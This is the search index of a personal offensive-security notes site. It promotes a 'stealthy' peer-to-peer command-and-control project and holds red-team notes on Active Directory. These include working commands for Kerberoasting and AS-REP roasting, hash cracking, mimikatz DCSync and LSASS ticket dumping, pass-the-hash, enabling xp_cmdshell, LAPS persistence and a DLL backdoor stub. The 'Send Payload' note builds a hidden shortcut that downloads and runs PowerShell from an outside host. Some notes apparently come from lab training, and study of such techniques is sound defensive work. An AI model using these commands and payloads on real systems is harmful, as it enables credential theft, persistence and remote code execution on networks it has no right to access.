{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Welcome to Skoving","text":"<p>Skoving is a centralized knowledge base and documentation hub for security research, software development, and decentralized systems.</p> <p>Here you will find detailed documentation for my open-source projects, CTF writeups, and technical blog posts.</p>"},{"location":"#featured-project","title":"Featured Project","text":""},{"location":"#skovenet","title":"SkoveNet","text":"<p>SkoveNet is the flagship project documented here. It is a fully decentralized peer-to-peer (P2P) Command &amp; Control (C2) system designed to be resilient, stealthy, and secure.</p> <p>The Philosophy</p> <p>No server. No domain. No single point of failure.</p> <p>Explore SkoveNet Documentation </p>"},{"location":"#categories","title":"Categories","text":"<p>The site is organized into the following sections:</p> <ul> <li> <p> Projects</p> <p>Deep dives into software architecture, design docs, and user manuals.  Go to Projects</p> </li> <li> <p> Writeups</p> <p>Walkthroughs and solutions for Capture The Flag (CTF) challenges and security assessments.  Go to Writeups</p> </li> <li> <p> Research { .disabled }</p> <p>Technical articles, tutorials, and updates on ongoing research.  Go to Research</p> </li> <li> <p> Notes </p> <p>Personal notes, cheat sheets, and reference materials.  Go to Notes</p> </li> </ul>"},{"location":"#quick-links","title":"Quick Links","text":"<p>Navigation Tip</p> <p>Use the navigation tabs at the top of the page or the sidebar to browse content. You can also search the entire documentation using the search bar (or press <code>s</code>).</p> <ul> <li>Installing SkoveNet: Getting Started Guide</li> <li>Understanding the Mesh: Network Architecture</li> <li>Contributing: Developer Guidelines</li> </ul> <p>Maintained by Skoving.</p>"},{"location":"notes/","title":"Overview","text":"Notes Second Brain <p>A personal knowledge base containing field notes, techniques, and research on offensive security.</p> \ud83c\udfd7\ufe0f Active Directory <p>Kerberos, LAPS, Certificate Services, and forest domination techniques.</p> \u279c \ud83c\udfaf Red Team <p>Full lifecycle operations: from initial access and enumeration to lateral movement and persistence.</p> \u279c \ud83c\udf10 Web Security <p>Client-side attacks, logic flaws, request smuggling, and modern protocol exploits.</p> \u279c \u2699\ufe0f Windows Internals <p>Deep dives into PE structure, memory management, DLL injection, and OS security mechanisms.</p> \u279c"},{"location":"notes/active%20directory/Certificate%20Services/","title":"Certificate Services","text":"<p>this is a service or role that the server can play so it will be CA (certificate authority)</p> <p>CA has a seperate module </p>"},{"location":"notes/active%20directory/Kerbros/","title":"Kerberos","text":"<p>first i have my username + password </p>"},{"location":"notes/active%20directory/Kerbros/#1-ask-for-tgt","title":"1. Ask For TGT","text":"<ol> <li>i send a AS-REQ (Auth service) to the DC contains timestamp encrypted with my hash</li> <li>DC response with AS-REP contains TGT + enc-part by my hash (contains session-key) now i have TGT+session-key</li> </ol>"},{"location":"notes/active%20directory/Kerbros/#as-rep-roasting","title":"AS-REP Roasting","text":""},{"location":"notes/active%20directory/Kerbros/#asroasting-asreproast-donotpreauth","title":"ASRoasting #ASREPRoast #DoNotPreAuth","text":"<p>the AS-REP contains the enc-part encrypted with the user hash, right? so when the user has <code>Do not require Kerberos preauthentication</code> enabled the KDC will send The AS-REP anyway whatever the AS-REQ is. so inside the AS-RES i can crack the enc-part. </p> <pre><code># enum\nldapsearch -x -H ldap://192.168.1.100 -D \"hacker@forest.lab\" -w \"palestine\" -b \"DC=forest,DC=lab\" \"(userAccountControl:1.2.840.113556.1.4.803:=4194304)\"\n\n# bruteforce \nGetNPUsers forest.lab/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.161.14\n\n# sinper\nRubeus.exe asreproast /user:userx /nowrap\n\n# crack \nhashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force\n</code></pre>"},{"location":"notes/active%20directory/Kerbros/#2-ask-for-tgs","title":"2. Ask For TGS","text":"<ol> <li>Again i send TGS-REQ to the DC contains the timestamp encrypted with the session-key + TGT + SPN</li> <li>DC response with TGS-REP contains the TGS ticket (encrypted with service hash) + enc-part (encrypted with session key)</li> </ol> <p>becuase the TGT encrypted with the <code>krbtgt</code>'s hash the DC can look into it. </p> <p>now i have TGS+new-session-key</p>"},{"location":"notes/active%20directory/Kerbros/#3-use-the-spn","title":"3. Use the SPN","text":"<p>i go to this services (SPN)</p> <ol> <li>i send AP-REQ contains the TGS + timestamp (enctyped with the session-key) </li> <li>the service should also verfiy that it's the real service (if it can decrpy the TGS) so it use the new-session-key and send also the timestamp encrypted with the new-session-key </li> </ol> <p>also becuase the TGS encrypted with the <code>serivce</code>'s hash the Service can look into it.</p>"},{"location":"notes/active%20directory/Kerbros/#kerberoasting","title":"Kerberoasting","text":""},{"location":"notes/active%20directory/Kerbros/#kerberoasting_1","title":"Kerberoasting","text":"<p>you said the the TGS ticket (not the enc-part) is encrypted with the target account's hash (usually a human user with weak password)? ok let's reverse it so i got the hash of this user (if this user is krbtgt or computer i will not try to crack his password). </p> <p>first let's get who has SPN (so has a TGS) but his password can be cracked (not service user). <pre><code>ldapsearch -x -H ldap://192.168.1.100 -D 'hacker@forest.lab' -w 'palestine' -b \"DC=forest,DC=lab\" \"(&amp;(sAMAccountType=805306368)(servicePrincipalName=*))\"\n\nGetUserSPNs.py forest.lab/hacker:palestine -dc-ip 192.168.1.100 \n</code></pre></p> <p>ok let's get his TGS and crack it <pre><code>GetUserSPNs.py forest.lab/hacker:palestine -dc-ip 192.168.1.100 -request -request-user srv_user -outputfile tgs_hashes.txt \n\nhashcat -a 0 -m 13100 tgs_hashes.txt wordlists\n</code></pre></p>"},{"location":"notes/active%20directory/Kerbros/#s4u","title":"S4U","text":""},{"location":"notes/active%20directory/Kerbros/#s4u2self","title":"S4U2Self","text":"<p>first i have my service account + its key</p> <ol> <li> <p>service sends TGS-REQ (S4U2Self) to the DC    </p> <ul> <li>contains the service ticket (proving itself)        </li> <li>asks for a ticket to itself (<code>SPN = service</code>) but with <code>client = userX</code> </li> </ul> </li> <li> <p>DC responds with TGS-REP </p> <ul> <li>contains a service ticket (client = userX, service = this service)</li> <li>session-key (encrypted with service\u2019s key)</li> </ul> </li> </ol> <p>now the service has a ticket that says: \u201cthis is userX talking to service\u201d \u2013 but in reality it was requested by the service.</p>"},{"location":"notes/active%20directory/Kerbros/#s4u2proxy","title":"S4U2Proxy","text":"<p>first i already have S4U2Self ticket (userX \u2192 service)</p> <ol> <li> <p>service sends TGS-REQ (S4U2Proxy) to the DC </p> <ul> <li>contains its own service ticket</li> <li>contains the S4U2Self ticket (userX \u2192 service)        </li> <li>asks for a ticket for <code>SPN = target service</code> (ex: MSSQL/sqlserver)</li> </ul> </li> <li> <p>DC responds with TGS-REP </p> <ul> <li>contains a service ticket (client = userX, service = target service)        </li> <li>new-session-key (encrypted with target service\u2019s key)            </li> </ul> </li> </ol> <p>now the first service can connect to the target service as userX.</p> <p>S4U2Proxy only works if the first service is allowed (constrained delegation) to talk to the target service.</p>"},{"location":"notes/active%20directory/LAPS/","title":"LAPS","text":"<p>local administrator password solution is a .msi you install  you can install the service and the tools that mange in the powershell like <code>Get-AdmPwdPassword</code>  so when you install it in the DC it adds two new properties to computer objects, called\u00a0<code>ms-Mcs-AdmPwd</code>\u00a0and\u00a0<code>ms-Mcs-AdmPwdExpirationTime</code>.</p> <p>check if there is LAPS or not by  <pre><code>ls \"C:\\Program Files\\LAPS\\CSE\"\n# GPO\nGet-DomainGPO | ? { $_.DisplayName -like \"*laps*\" } | select DisplayName, Name, GPCFileSysPath | fl\n\nGet-DomainObject -SearchBase \"LDAP://DC=forest,DC=lab\" | ? { $_.\"ms-mcs-admpwdexpirationtime\" -ne $null } | select DnsHostname\n# Acl \nGet-DomainObjectAcl -SearchBase \"LDAP://DC=forest,DC=lab\" -ResolveGUIDs | ? { $_.ObjectAceType -eq \"ms-Mcs-AdmPwd\" -and $_.ActiveDirectoryRights -like \"*ReadProperty*\" } | select ObjectDN, SecurityIdentifier\n</code></pre></p> <p>of course if you are domain admin you can read this passwords:  <pre><code>Get-AdmPwdPassword -ComputerName \"wkstn-2\"\n</code></pre></p>"},{"location":"notes/active%20directory/LAPS/#persistance","title":"persistance","text":"<p>extend the experation time to be unlimted <pre><code>Set-DomainObject -Identity wkstn-2 -Set @{\"ms-mcs-admpwdexpirationtime\"=\"232609935231523081\"}\n</code></pre></p>"},{"location":"notes/active%20directory/LAPS/#backdoor","title":"backdoor","text":"<p>the powershell moduel in <code>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\AdmPwd.PS\\</code> since you can found the code here you can edit the code and replace the file <code>AdmPwd.PS.dll</code></p> <p>Main/AdmPwd.PS/Main.cs ```powershell [Cmdlet(\"Get\", \"AdmPwdPassword\")] public class GetPassword : Cmdlet {     [Parameter(Mandatory = true, Position = 0, ValueFromPipeline = true)]     public String ComputerName;</p> <pre><code>protected override void ProcessRecord()\n{\n    foreach (string dn in DirectoryUtils.GetComputerDN(ComputerName))\n    {\n        PasswordInfo pi = DirectoryUtils.GetPasswordInfo(dn);\n        ## EDIT HERE ;)\n        WriteObject(pi);\n    }\n}\n</code></pre> <p>}</p>"},{"location":"notes/red/proxying/","title":"SSH","text":"<pre><code># --- DYNAMIC TUNNELING (The SOCKS5 Proxy) ---\n# Turns your SSH client into a local SOCKS5 proxy on port 1080. \nssh -D 1080 -N -f user@middle\n\n# --- VPN-STYLE ROUTING (sshuttle) ---\n# Intercepts all traffic for a specific subnet (192.168.1.0/24) and routes it over SSH.\n# Best for: Making all apps (SMB, HTTP, DB) work without configuring any proxy settings.\n# (Requires 'sshuttle' installed on your local machine)\nsshuttle -r user@middle 192.168.1.0/24\n\n# --- STATIC LOCAL FORWARDING ---\n# Maps a specific port on your machine (8080) to a specific remote service (internal-web:80).\n# Best for: Accessing a single specific internal dashboard or database.\nssh -L 8080:internal-web:80 -N -f user@middle\n\n# --- JUMP HOST (Chaining) ---\n# Uses the middle server as a \"jump box\" to SSH directly into a hidden inner server.\n# Best for: Accessing the terminal of servers that aren't public-facing.\nssh -J user@middle user@inner-server\n\n# --- REVERSE TUNNELING ---\n# Opens a port on the middle server (9000) that forwards back to your local port (3000).\n# Best for: Letting people on the remote network see a website running on your laptop.\nssh -R 9000:localhost:1217 -N -f ubuntu@91.92.202.116\nssh -R 0.0.0.0:1217:localhost:1217 -f -N ubuntu@91.92.202.116\n\n# --- LAYER 3 TUNNEL (True VPN) ---\n# Creates a virtual network interface (tun0) for full packet-level routing.\n# Best for: Advanced network-to-network routing (Requires root on both ends).\nssh -w 0:0 root@middle\n\n# --- ESCAPE THE SHELL (Backgrounding) ---\n# -N : Do not execute a remote command (use for tunnels only).\n# -f : Requests SSH to go to background just before command execution.\n# Use these flags with any -L, -D, or -R command to keep it running silently.\n</code></pre>"},{"location":"notes/red/proxying/#ligolo-ng-vpn","title":"Ligolo-ng (VPN)","text":""},{"location":"notes/red/proxying/#chisel","title":"Chisel","text":"<p>if it is okey to drop binaries to the machine download chisel : <pre><code>curl  -L https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_linux_386.deb -o /tmp/xchisel.deb &amp;&amp; dpkg-deb -x /tmp/xchisel.deb /tmp &amp;&amp; mv /tmp/usr/bin/chisel .\n\n# Forward\n# first Hoob\nchisel server -p 1080 --socks5\n\n# attacker\nchisel client &lt;TARGET_IP&gt;:1080 1080:socks\n\n# or Reverse\n# attacker\nchisel server --socks5 --reverse\n\n# first Hoob\nchisel client &lt;ATTACK_IP&gt;:1080 R:socks # full network \nchisel client &lt;ATTACK_IP&gt;:1080 R:1234:10.0.0.3:1234 # port forward\n\n# or both \nchisel server -p 1080 --reverse --socks5\nchisel client 91.92.141.42:1080 1080:socks R:8080:127.0.0.1:8080\n</code></pre></p>"},{"location":"notes/red/proxying/#chisel-help","title":"chisel help","text":"<pre><code>chisel client &lt;SERVER_IP:PORT&gt; &lt;Syntax&gt;\n\nSOCKS Syntax:\n    R:1234:socks -&gt; proxy on the server at port 1234 \n    1234:socks -&gt; proxy on THIS computer at port 1234\n    (both do the same, jsut edit the conf of proxychais4)\n</code></pre>"},{"location":"notes/red/proxying/#windows","title":"windows","text":""},{"location":"notes/red/proxying/#lolbin","title":"LOLbin","text":"<pre><code># forwarding rule\nnetsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=445 connectaddress=192.168.1.6 connectport=445 protocol=tcp\n\n# firewall rule \nnetsh advfirewall firewall add rule name=\"\" dir=in action=allow protocol=TCP localport=\n</code></pre> <p>check: <pre><code>netsh interface portproxy show v4tov4\n</code></pre> clean: <pre><code>netsh int port delete v4tov4 listenaddress= listenport=\nnetsh advfirewall firewall delete rule name=\"\"\n</code></pre></p>"},{"location":"notes/red/proxying/#other","title":"Other","text":""},{"location":"notes/red/proxying/#kernal-forwarding","title":"kernal forwarding","text":"<p>you can forward smb connection to another port without stopping the SMB wiht <code>SteamDivert</code> <pre><code># conf file (redir.conf)\ntcp &lt; 445 0.0.0.0 -&gt; 192.168.1.6 445\n\n# it will load the driver (singed)                                    ;) \nStreamDivert.exe redir.conf -v \n</code></pre></p>"},{"location":"notes/red/windows/Active%20directory%20techniques/","title":"Active Directory Techniques","text":""},{"location":"notes/red/windows/Active%20directory%20techniques/#authentication-relays","title":"Authentication Relays","text":"<p>when Windows Resolver (OS network stack) got nothing from DNS cloud use LLMNR, NBT-NS or WPAD  these protocols send a broadcast message to ask all the LAN about the destination. </p> <p>as a good bad hacker i will say yes it is me so it will make NTLM auth with me. i will send challenge and hr will send the challenge response, I will use Hashcat to crack this NetNTLMv2 challenge/response, which is computed using the user\u2019s NT hash. </p> <p>i use responder for this. </p> <p>if the SMB or whatever the service that use NTLM deosn't enforce signature i can use MITM. but it will fail if the user have no permission on the object that we want to access </p> <p> </p>"},{"location":"notes/red/windows/Active%20directory%20techniques/#ldap-authentication-pass-back-attack","title":"LDAP Authentication &amp; Pass-back Attack","text":"<p>Applications can use LDAP to authenticate directly with Active Directory. Instead of letting Windows handle NTLM, the app itself sends username/password to AD for validation.</p> <p>Those apps need AD credentials stored in config (often service accounts). Sometimes they\u2019re stored in plain text. If you compromise the app server, you may find them directly.</p> <p>Instead of stealing the config file, you can trick the device:</p> <ol> <li>Change its LDAP server setting (e.g. in printer web panel) from the real DC IP \u2192 your attacker IP.</li> <li>It sends the LDAP username/password to your rogue LDAP server.</li> <li>You capture the creds in cleartext.</li> </ol> <p>you have to start slapd service (LDAP server) </p> <p>and use these configration to make it use plain passwords only </p> <pre><code>#olcSaslSecProps.ldif\ndn: cn=config\nreplace: olcSaslSecProps\nolcSaslSecProps: noanonymous,minssf=0,passcred\n\nsudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif\n</code></pre>"},{"location":"notes/red/windows/Active%20directory%20techniques/#tgt-grant-using-the-hash-only","title":"TGT grant using the hash only","text":"<pre><code>getTGT.py FOREST.LAB/menna:palestine -dc-ip 192.168.1.100\ngetTGT.py FOREST.LAB/menna -hashes :37f9beff5ca917436cf4f0fb32856b4a -dc-ip 192.168.1.100\n</code></pre> <p>extract all the domain creds with, it will fake a backup (DCSync). <pre><code>lsadump::dcsync /domain:forest.lab /all\n</code></pre></p>"},{"location":"notes/red/windows/0%25/AD-enum/","title":"AUTH","text":""},{"location":"notes/red/windows/0%25/AD-enum/#username-hash","title":"username + hash","text":"<pre><code>mimikatz # sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH \nevil-winrm -i &lt;IP&gt; -u &lt;USERNAME&gt; -H &lt;NTLM_HASH&gt;\npsexec.py DOMAIN/USERNAME@TARGET -hashes &lt;LM_HASH&gt;:&lt;NT_HASH&gt;\n\nRubeus.exe asktgt /user:jking /aes256:&lt;hash&gt; /domain:DEV /opsec /nowrap\n</code></pre>"},{"location":"notes/red/windows/0%25/AD-enum/#username-password","title":"username + password","text":"<p>create a fake session for non-domain machines. <pre><code>runas /netonly /user:za.tryhackme.com\\jenna.field cmd.exe\n== \nrubeus createnetonly /program:cmd.exe /show:true /ticket:&lt;file or base64&gt; /domain:forest.lab /opsec \n\nRubeus.exe asktgt /user:jking /password:&lt;pass&gt; /domain:DEV /opsec /nowrap\n</code></pre></p> <p>now any network auth will automaticlly use these session. Now you can run: <pre><code>mmc.exe # to run AD users and Groups for example\ndir \\\\thmdc.za.tryhackme.com\\SYSVOL # == smbclient \nnet view \\\\thmdc.za.tryhackme.com\n</code></pre></p>"},{"location":"notes/red/windows/0%25/AD-enum/#tgt-only","title":"TGT only","text":"<pre><code>rubeus createnetonly /program:cmd.exe /ticket:&lt;ticket&gt;\nrubeus.exe ptt /ticket:&lt;base64 or file&gt;\n</code></pre>"},{"location":"notes/red/windows/0%25/AD-enum/#enum","title":"Enum","text":""},{"location":"notes/red/windows/0%25/AD-enum/#ad-objects-strucuture","title":"AD objects strucuture","text":"<pre><code># BASIC\n([ADSI]\"LDAP://192.168.1.100/CN=Users,DC=forest,DC=lab\").psbase.children \n([ADSI]\"LDAP://192.168.1.100/RootDSE\").defaultNamingContext\n</code></pre> <ul> <li>Templates <pre><code># BASE \n$searcher = New-Object DirectoryServices.DirectorySearcher\n$searcher.SearchRoot = \"LDAP://192.168.1.100/DC=forest,DC=lab\"\n--- \n\n# USERS \n$searcher.Filter = \"(objectClass=user)\"\n$searcher.FindAll() | % { $_.Properties.samaccountname }\n\n# enabled USERS (via UAC)\n$searcher.Filter = \"(&amp;(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))\"\n$searcher.FindAll() | % { $_.Properties.samaccountname }\n\n# COMPUTERS \n$searcher.Filter = \"(objectClass=computer)\"\n$searcher.FindAll() | % { $_.Properties.dnshostname }\n\n# DCs\n$searcher.Filter = \"(userAccountControl:1.2.840.113556.1.4.803:=8192)\"\n$searcher.FindAll() | % { $_.Properties.dnshostname }\n\n# GROUPS\n$searcher.Filter = \"(objectClass=group)\"\n$searcher.FindAll() | % { $_.Properties.samaccountname }\n\n#Specific Group by Name \n$searcher.Filter = \"(&amp;(objectClass=group)(cn=Domain Admins))\"\n$searcher.FindAll() | % { $_.Properties.distinguishedname }\n\n# Service Accounts \n$searcher.Filter = \"(&amp;(objectClass=user)(servicePrincipalName=*))\"\n$searcher.FindAll() | % { $_.Properties.samaccountname }\n\n# GPOs\n$searcher.Filter = \"(objectClass=groupPolicyContainer)\" $searcher.FindAll() | % { $_.Properties.displayname }\n</code></pre></li> </ul>"},{"location":"notes/red/windows/0%25/AD-enum/#explore","title":"Explore","text":""},{"location":"notes/red/windows/0%25/AD-enum/#smb","title":"SMB","text":"<p>find all SMB in the network  <pre><code>Find-DomainShare -ComputerDomain cyberbotic.io -CheckShareAccess\n</code></pre></p>"},{"location":"notes/red/windows/0%25/AD-enum/#mssql","title":"MSSQL","text":"<p>hacktricks SQLRecon, PowerUpSQL, mssqlclient.py (impacket), bloodhound, HeidiSQL (GUI SQL client), sqlcmd (windows) <pre><code># PowerUpSQL\nGet-SQLInstanceDomain\nGet-SQLConnectionTest -Instance \"srv-1.dev.cyberbotic.io,1433\"\nGet-SQLServerInfo -Instance \"srv-1.dev.cyberbotic.io,1433\"\nGet-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLServerInfo\n Get-SQLQuery -Instance \"srv-1.dev.cyberbotic.io,1433\" -Query \"select @@servername\"\n</code></pre></p> <pre><code># BlodHound\nMATCH p=(u:User)-[:SQLAdmin]-&gt;(c:Computer) RETURN p\n</code></pre>"},{"location":"notes/red/windows/0%25/AD-enum/#run-command","title":"Run Command","text":"<p>Invoke-SQLOSCmd will enable the <code>xp_cmdshell</code> automaticly  <pre><code>Invoke-SQLOSCmd -Instance \"srv-1.dev.cyberbotic.io,1433\" -Command \"whoami\" -RawResults\n</code></pre> or manual  <pre><code># SQLcmd or any client \nEXEC xp_cmdshell 'whoami';\n# \u26a0\ufe0f error becuase the xp_cmdshell disabled, you can enable it but you need to be high privilages.\nsp_configure 'Show Advanced Options', 1\nRECONFIGURE\nsp_configure 'xp_cmdshell', 1\nRECONFIGURE\n</code></pre></p>"},{"location":"notes/red/windows/0%25/AD-enum/#ntlm-relay","title":"NTLM relay","text":"<p>the query <code>EXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1</code> will do a NTLM auth with  10.10.17.231 so we can do a [[skove/notes/windows/70%/Leteral Movement/Leteral Movement#NTLM relaying]]</p> <p>you can use the hash to make a sliver ticket and forge your groups to be sysadmin. </p>"},{"location":"notes/red/windows/0%25/AD-enum/#impersonation","title":"impersonation","text":"<p>check  <pre><code>SQLRecon.exe /a:wintoken /h:dc19.forest.lab /port:1434 /m:impersonate\nSQLRecon.exe /a:wintoken /h:dc19.forest.lab /port:1434 /i:FOREST\\menna /m:query /c:\"SELECT IS_SRVROLEMEMBER('sysadmin');\"\n</code></pre></p>"},{"location":"notes/red/windows/0%25/AD-enum/#enum_1","title":"enum","text":"<pre><code># all logged in users\nSELECT name FROM sys.server_principals\n</code></pre>"},{"location":"notes/red/windows/0%25/Zero/","title":"Domain Enum","text":"<pre><code>ldapsearch -H ldap://10.10.239.149 -x -LLL -s base -b \"\"\n</code></pre>"},{"location":"notes/red/windows/0%25/Zero/#usernames-enum","title":"Usernames Enum","text":""},{"location":"notes/red/windows/0%25/Zero/#1-unauthenticated-null-session-enumeration","title":"1. Unauthenticated / Null Session Enumeration","text":"<pre><code># bruteforce \nkerbrute userenum --dc 10.10.239.149 -d vulnnet-rst.local users.txt\nimpacket-lookupsid vulnnet-rst.local/guest@10.10.72.218 # \nnmap --script krb5-enum-users --script-args krb5-enum-users.realm='corp.local',userdb=users.txt -p 88 10.10.10.10\nnxc smb &lt;dc_ip&gt; --rid-brute 10000 # bruteforcing RID\n\n# enum4linux\nenum4linux -U &lt;DC_IP&gt;\n\n# SMB Null Session\nnxc smb &lt;dc_ip&gt; --users\nsmbclient -L //&lt;DC_IP&gt; -N\nnet rpc share -S &lt;DC_IP&gt; -N\n\n# LDAP anonymous Bind \nldapsearch -x -H ldap:// -b \"DC=lab,DC=local\" \"(objectClass=user)\" \n\n# RPC Null Session\nrpcclient -U \"\" -N &lt;DC_IP&gt;\nrpcclient $&gt; enumdomusers\nrpcclient $&gt; queryuser &lt;RID&gt;\n</code></pre>"},{"location":"notes/red/windows/0%25/Zero/#2-authenticated","title":"2. Authenticated","text":"<ul> <li>powershell AD Module</li> <li>powerview </li> <li>cmd net user /domain</li> <li>LDAP Queries -&gt; [[skove/skoving/notes/red/windows/0%/AD-enum#Enum]] </li> <li>SharpHound</li> </ul>"},{"location":"notes/red/windows/0%25/Zero/#only-username","title":"Only username","text":"<pre><code>impacket-GetNPUsers &lt;domain&gt;/ -usersfile users.txt\n</code></pre>"},{"location":"notes/red/windows/0%25/send%20payload/","title":"Send Payload","text":"<p>create a .lnk that grep .ps1 that download .exe and run it  <pre><code>$WshShell = New-Object -ComObject WScript.Shell\n$Shortcut = $WshShell.CreateShortcut(\"$env:USERPROFILE\\Link.lnk\")\n$Shortcut.TargetPath = \"powershell.exe\"\n$command = 'IEX ((new-object net.webclient).downloadstring(''http://anas.com:6656/a''))'\n$Shortcut.Arguments = \"-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `\"${command}`\"\"\n$Shortcut.IconLocation = \"powershell.exe\"\n$Shortcut.Save()\n</code></pre></p>"},{"location":"notes/red/windows/10%25/foothold/","title":"Foothold","text":""},{"location":"notes/red/windows/10%25/foothold/#username-password-or-hash","title":"username + password (or hash)","text":"<ul> <li>SMB / Admin Shares \u2192 <code>psexec.py</code>, <code>smbexec.py</code>, <code>wmiexec.py</code>, <code>PsExec.exe</code> PowerShell <code>Invoke-WmiMethod</code></li> <li>WinRM (PS Remoting) \u2192 <code>evil-winrm</code>, <code>Enter-PSSession</code>, <code>Invoke-Command</code></li> <li>SSH -&gt; <code>ssh</code></li> <li>DCOM \u2192 <code>Invoke-DCOM.ps1</code>, MMC20.Application, ShellWindows, <code>dcomexec.py</code></li> <li>Scheduled Tasks \u2192 <code>schtasks.exe</code>, <code>at.exe</code></li> <li>SCM (Services) \u2192 <code>sc.exe</code>, PsExec technique</li> <li>MSSQL \u2192 <code>mssqlclient.py</code>, <code>xp_cmdshell</code></li> <li>LDAP / Kerberos (Domain) \u2192 <code>ldapsearch</code>, Impacket Kerberos tools</li> <li>VPN / Web Portals (OWA, etc.) \u2192 reuse creds for remote access</li> <li>RDP \u2192 <code>xfreerdp</code>, <code>rdesktop</code>, <code>mstsc</code></li> </ul>"},{"location":"notes/red/windows/70%25/Enum/","title":"Enumeration","text":"<ol> <li>Seatbelt     -group=system,user,misc or -group=all      InternetSettings</li> <li>SharpUp (privesc)         SharpUp.exe audit             -&gt; Runs all vulnerability checks regardless of integrity level or group membership.         SharpUp.exe HijackablePaths             -&gt; Check only if there are modifiable paths in the user's %PATH% variable.         SharpUp.exe audit HijackablePaths             -&gt; Check only for modifiable paths in the user's %PATH% regardless of integrity level or group membership.  </li> </ol>"},{"location":"notes/red/windows/70%25/Enum/#defenses","title":"Defenses","text":"<p><pre><code># windows Defender\nGet-MpComputerStatus | Select-Object -Property AntivirusEnabled, AMServiceEnabled, RealTimeProtectionEnabled\n\n# App locker\nreg query \"HKLM\\Software\\Policies\\Microsoft\\Windows\\SrpV2\\\"\n\n(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object RuleCollectionType, EnforcementMode\n\n(Get-AppLockerPolicy -Effective).RuleCollections.Exe.Rules\n</code></pre>  Try to bypass by using \"LOLBAS's\".</p>"},{"location":"notes/red/windows/70%25/Enum/#services","title":"Services","text":"<pre><code># process\ntasklist\n\n# open ports\nGet-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess, State | Sort-Object LocalPort\n</code></pre>"},{"location":"notes/red/windows/70%25/ExFil/","title":"Exfiltration","text":""},{"location":"notes/red/windows/70%25/ExFil/#network-discover","title":"Network Discover","text":"<pre><code>Find-DomainShare -ComputerDomain cyberbotic.io -CheckShareAccess\nGet-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLColumnSampleDataThreaded -Keywords \"project\" -SampleSize 5 | select instance, database, column, sample | ft -autosize\n</code></pre>"},{"location":"notes/red/windows/70%25/ExFil/#dpapi","title":"DPAPI","text":"<pre><code>reg save HKLM\\SYSTEM system \nreg save HKLM\\SAM sam\nntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\ntds_dump\"\n</code></pre> <p>Extract tickets in the current LUID (not elevated): <pre><code>mimikatz # privilege::debug\nmimikatz # token::elevate\nmimikatz # standard::base64 /output:true\nmimikatz # kerberos::list /export\n</code></pre></p> <p>Extract all LUID's tickets from LSASS' memory: <pre><code>mimikatz # privilege::debug\nmimikatz # standard::base64 /output:true\nmimikatz # sekurlsa::tickets /export\n</code></pre></p> <p>if DC: <pre><code>mimikatz # lsadump::dcsync /user:krbtgt\n</code></pre></p>"},{"location":"notes/red/windows/70%25/ExFil/#dpapi_1","title":"DPAPI","text":"<p>1- list the existing keys: <pre><code>vaultcmd /list\nvaultcmd /listcreds:\"Windows Credentials\" /all\nseatbelt windowsvault\nmimikatz # \n</code></pre></p> <p>2- decryp the master key <pre><code>mimikatz # dpapi::masterkey /in:C:\\Users\\anas\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-928519608-2129186809-3979170226-1000\\18c7ae13-493d-42d0-b6cd-8a15eb6ff8d8  /system:system.hive /security:security.hive\n</code></pre></p>"},{"location":"notes/red/windows/70%25/PrivEsc/","title":"Privilege Escalation","text":"<p>before running winpeas, think of all the functions you can do with the cuurent user. maybe there is no bug or there is easier way like extract the administrator hash to bypass the UAC with pass the hash.</p> <p>Hacktricks</p> <p>Unquoted Service Paths <pre><code>wmic service get name, pathname\n\nGet-Acl -Path \"C:\\Program Files\\Vuln Services\" | fl\nor \nicacls \"C:\\Program Files\"\n</code></pre></p> <p>check the service permistion  <pre><code>sc sdshow anaservice # SDDL format\n(Get-Acl -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\anaservice\").access\n</code></pre></p> <p>if <pre><code>HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 1\nHKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated = 1\n</code></pre> any .msi will runs as SYSTME whatever who are ryou </p> <p>if you are in localadmins could bypass the UAC </p>"},{"location":"notes/red/windows/70%25/PrivEsc/#krbrelay","title":"Krbrelay","text":"<ol> <li>create a computer:  <pre><code>StandIn.exe --computer evilcomputer --make \n</code></pre></li> <li>check a COM port: <pre><code>CheckPort.exe \n</code></pre></li> <li> <p>run krbRelay: <pre><code>KrbRelay.exe -spn ldap/dc19.forest.lab -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd &lt;evilcomputer-SID&gt; -port 10\n</code></pre></p> </li> <li> <p>check the attribute: <pre><code>Get-DomainComputer -Identity 'win10' -Properties \"msDS-AllowedToActOnBehalfOfOtherIdentity\"\n</code></pre></p> </li> <li> <p>S4U attack: <pre><code>Rubeus.exe s4u /impersonateuser:hana /msdsspn:cifs/dc19.forest.lab /user:win10$ /ticket:&lt;win10$-TGT-base64&gt; /nowrap /opsec\n</code></pre></p> </li> </ol>"},{"location":"notes/red/windows/70%25/PrivEsc/#gpo-abuse","title":"GPO abuse","text":"<pre><code>Get-GPO -All \nhttps://github.com/FSecureLABS/SharpGPOAbuse\n</code></pre>"},{"location":"notes/red/windows/70%25/Leteral%20Movement/Leteral%20Movement/","title":"Lateral Movement","text":"<p>Pass The Hash: it's means injecting the hash into LSASS.exe or use it to in NTLM challange. becuase NTLM only use the hash in auth. 